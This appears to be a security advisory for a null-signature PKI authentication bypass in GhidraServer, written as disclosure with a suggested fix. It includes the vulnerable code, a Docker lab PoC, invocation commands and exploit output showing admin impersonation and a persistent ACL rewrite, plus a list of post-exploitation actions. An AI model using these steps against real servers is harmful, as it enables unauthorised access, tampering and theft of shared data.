# GhidraServer PKI User Impersonation via Null Signature

### Summary

A null-signature flaw in GhidraServer's PKI authentication module allows any user with a valid CA-signed certificate to impersonate any other user on the server. The attacker only needs the target's **public** certificate — their private key is not required. This enables a low-privileged analyst to escalate to administrator, exfiltrate or destroy shared reverse engineering databases, and permanently rewrite repository access controls.

The vulnerability exists in `PKIAuthenticationModule.authenticate()`, which skips client signature verification when the signature bytes are null instead of rejecting the authentication attempt. It has been present since Ghidra's initial open-source release in March 2019 and affects all versions through at least 12.0.4.

### Details

GhidraServer's PKI mode (`-a2`) authenticates users via a challenge-response protocol: the server sends a random 64-byte token, the client signs it with their private key, and the server verifies the signature against the client's certificate. This proves the client possesses the private key corresponding to the certificate they present.

The flaw is in the server-side verification at [`PKIAuthenticationModule.java:143-152`](https://github.com/NationalSecurityAgency/ghidra/blob/78729379e471bbb3d969409be6a8c3d24af84220/Ghidra/Features/GhidraServer/src/main/java/ghidra/server/security/PKIAuthenticationModule.java#L143-L152):

```java
byte[] sigBytes = sigCb.getSignature();
if (sigBytes != null) {                              // ← null → entire block skipped

    Signature sig = Signature.getInstance(certChain[0].getSigAlgName());
    sig.initVerify(certChain[0]);
    sig.update(token);
    if (!sig.verify(sigBytes)) {
        throw new FailedLoginException("Incorrect signature");
    }
}
// Falls through to DN lookup without any exception

String dnUsername =
    userMgr.getUserByDistinguishedName(certChain[0].getSubjectX500Principal());
if (dnUsername != null) {
    return dnUsername;                                // ← Authenticated!
}
```

When `sigBytes` is null, the verification block is skipped entirely — no exception is thrown. Execution falls through to the Distinguished Name lookup, which resolves the certificate's subject DN to a registered username and returns it as the authenticated identity. No proof of private key possession was required.

**Interaction with mTLS:** In PKI mode, GhidraServer enables mutual TLS (`needClientAuth=true`) on the SSL socket. The attacker must present a valid CA-signed certificate during the TLS handshake. However, there is no binding between the certificate used in the TLS layer and the certificate presented in the `SignatureCallback`. A comment at [line 98-100](https://github.com/NationalSecurityAgency/ghidra/blob/79d8f164f8bb8b15cfb60c5d4faeb8e1c25d15ca/Ghidra/Features/GhidraServer/src/main/java/ghidra/server/security/PKIAuthenticationModule.java#L98-L100) confirms this limitation:

```java
// assume we are operating over a secure authenticated socket -
// unfortunately, there appears no way to obtain PKI credentials
// used when authenticating SSL connection with client
```

The attacker completes mTLS with their own certificate (proving they hold *their own* private key), then presents a *different* certificate (the target's public cert) in the `SignatureCallback` with a null signature. The server validates each layer independently and has no mechanism to detect the mismatch.

**Certificate availability:** The attacker needs the target's public X.509 certificate, which is public by design in PKI environments. Public certificates are routinely available through LDAP directories, S/MIME email headers, certificate transparency logs, badge systems, and shared network drives.

### PoC

**Prerequisites:**
- Docker and Docker Compose (to spin up a test GhidraServer)
- A local Ghidra installation (for compiling and running the exploit)

**Initial state — admin-only repository:**

The Docker image in `poc/docker/` bundles GhidraServer with a complete PKI hierarchy. On first boot, the container:
1. Generates a PKI hierarchy: CA, `admin` cert/key, `analyst` cert/key, `server` cert/key
2. Registers two users: `admin` (DN: `CN=admin,O=GhidraDemo,C=US`) and `analyst` (DN: `CN=analyst,O=GhidraDemo,C=US`)
3. Creates `SecretAnalysis` — a repository with an admin-only ACL. The `analyst` user has no ACL entry and cannot see the repository

**Start the server:**

```bash
cd poc/docker
docker compose up --build -d
```

**Run the demo:**

```bash
cd poc
export GHIDRA_HOME=/path/to/ghidra_12.0.4_PUBLIC
export PKI_DIR="$PWD/docker/pki"
export HOST=localhost
bash demo.sh
```

`demo.sh` compiles `Poc.java` on the first run and executes the three steps below.

---

**Step 1 — Analyst checks access (before exploit)**

The analyst authenticates with their own legitimate certificate and private key. They are not in the `SecretAnalysis` ACL and see nothing:

```
========================================================================
 GhidraServer PKI Privilege Escalation — Null Signature Bypass
========================================================================

  Target server:   localhost:13100
  User cert:       CN=analyst, O=GhidraDemo, C=US
  CA:              CN=DemoCA, O=GhidraDemo, C=US
  Mode:            Normal authentication

========================================================================
 CONNECTED — AUTHENTICATED AS: analyst
========================================================================

  Server users (2):
    - admin
    - analyst
  Repositories (0):

========================================================================
```

---

**Step 2 — Run exploit (null-signature impersonation + ACL rewrite)**

The analyst presents admin's public certificate with a null signature. The server skips verification and authenticates the session as `admin`. The exploit then calls `setUserList()` to add `analyst` as `ADMIN` on every repository:

```
========================================================================
 GhidraServer PKI Privilege Escalation — Null Signature Bypass
========================================================================

  Target server:   localhost:13100
  User cert:       CN=analyst, O=GhidraDemo, C=US
  CA:              CN=DemoCA, O=GhidraDemo, C=US
  Target cert:     CN=admin, O=GhidraDemo, C=US
  Mode:            EXPLOIT + ESCALATE (null signature bypass)

========================================================================
 EXPLOIT SUCCEEDED — AUTHENTICATED AS: admin
========================================================================

  mTLS layer identity:        CN=analyst, O=GhidraDemo, C=US
  Application layer identity:  admin (from CN=admin, O=GhidraDemo, C=US)
  Target private key used:     NO

  Server users (2):
    - admin
    - analyst

────────────────────────────────────────────────────────────────────────
 ESCALATION: Granting attacker persistent ADMIN access
────────────────────────────────────────────────────────────────────────

[E1] Determining attacker's real server username...
     Attacker username: analyst

[E3] Escalating attacker on 1 repository(ies)...

     Repository: SecretAnalysis
     Current ACL:
       admin (admin)
     Updated ACL:
       admin (admin)
       analyst (admin)

────────────────────────────────────────────────────────────────────────
 VERIFICATION: Attacker authenticating with own credentials
────────────────────────────────────────────────────────────────────────

  (Normal authentication — no exploit, using attacker's own
   certificate and private key to prove this persists)

  Authenticated as: analyst (normal login, no exploit)
  Accessible repositories (1):
    - SecretAnalysis [analyst (admin)]

========================================================================
 ESCALATION COMPLETE
========================================================================

  Attacker 'analyst' now has ADMIN on all repos.
  This access is PERSISTENT — it survives server restarts
  and does not require further exploitation.
========================================================================
```

---

**Step 3 — Analyst checks access (after exploit)**

The analyst authenticates normally — no exploit, their own certificate and private key. The ACL rewrite persists on disk and the analyst now sees `SecretAnalysis`:

```
========================================================================
 GhidraServer PKI Privilege Escalation — Null Signature Bypass
========================================================================

  Target server:   localhost:13100
  User cert:       CN=analyst, O=GhidraDemo, C=US
  CA:              CN=DemoCA, O=GhidraDemo, C=US
  Mode:            Normal authentication

========================================================================
 CONNECTED — AUTHENTICATED AS: analyst
========================================================================

  Server users (2):
    - admin
    - analyst
  Repositories (1):
    - SecretAnalysis

========================================================================
```

The GhidraServer log shows `User 'admin' authenticated` for the exploit session — indistinguishable from a legitimate admin login. The analyst's identity never appears in the server log until they subsequently log in with their own credentials.

---

**Manual invocation (without demo.sh):**

Compile `Poc.java` locally against Ghidra's libraries, then run against the Docker container (or any GhidraServer host):

```bash
cd poc
GHIDRA_HOME=/path/to/ghidra_PUBLIC
PKI_DIR=docker/pki
CP="."
for jar in $(find "$GHIDRA_HOME/Ghidra" -name "*.jar" \
    \( -path "*/GhidraServer/*" -o -path "*/FileSystem/*" -o -path "*/DB/*" \
       -o -path "*/Generic/*" -o -path "*/Utility/*" -o -path "*/Docking/*" \
       -o -path "*/Help/*" -o -path "*/Gui/*" \) | sort); do
    CP="$CP:$jar"
done
javac -cp "$CP" Poc.java

# Check access before exploit (normal auth — no --target-cert)
java -cp "$CP" -Dghidra.cacerts="$PKI_DIR/cacerts" Poc \
    --host     localhost --port 13100 \
    --user-key "$PKI_DIR/user.p12" \
    --ca-cert  "$PKI_DIR/ca.crt" \
    --password changeit

# Run exploit (null-signature impersonation + persistent ADMIN escalation)
java -cp "$CP" -Dghidra.cacerts="$PKI_DIR/cacerts" Poc \
    --host        localhost \
    --port        13100 \
    --target-cert "$PKI_DIR/admin.crt" \
    --user-key    "$PKI_DIR/user.p12" \
    --ca-cert     "$PKI_DIR/ca.crt" \
    --password    changeit
```

### Impact

**Vulnerability type:** Authentication bypass / horizontal privilege escalation within a PKI trust boundary.

**Who is impacted:** All GhidraServer deployments using PKI authentication mode (`-a2`). 

**Attacker profile:** Any user who holds a valid certificate from the organization's CA. 

**Post-exploitation capabilities:** Once authenticated as the target user, the attacker inherits all of the target's permissions across every repository. The GhidraServer API exposes the following operations:

| Action | API | Severity |
|---|---|---|
| Rewrite repository ACLs | `setUserList()` | **Critical** — permanent privilege escalation. Attacker grants their real account ADMIN access, persisting beyond any patch. |
| Delete programs and version history | `deleteItem(path, name, -1)` | **Destructive** — irrecoverable loss of shared reverse engineering work. |
| Modify shared analysis | `checkout()` → `openDatabase()` → `checkin()` | **Integrity** — silent tampering with function names, types, annotations, and comments that other analysts will trust. |
| Exfiltrate program databases | `getRepository()` → `openDatabase()` | **Confidentiality** — theft of analysis of malware, exploits, or proprietary software. |
| Enumerate all server users | `getAllUsers()` | **Reconnaissance** — maps the organization's analyst team. |
| Create new repositories | `createRepository()` | **Persistence** — attacker gets ADMIN on the new repo under the victim's name. |

### Suggested Fix

**Suggested fix:** Replace the conditional skip with a mandatory rejection in `PKIAuthenticationModule.java:143-144`:

```java
byte[] sigBytes = sigCb.getSignature();
if (sigBytes == null) {
    throw new FailedLoginException("Client signature required");
}
// Existing verification code continues unchanged
```

PR: https://github.com/NationalSecurityAgency/ghidra/pull/9109
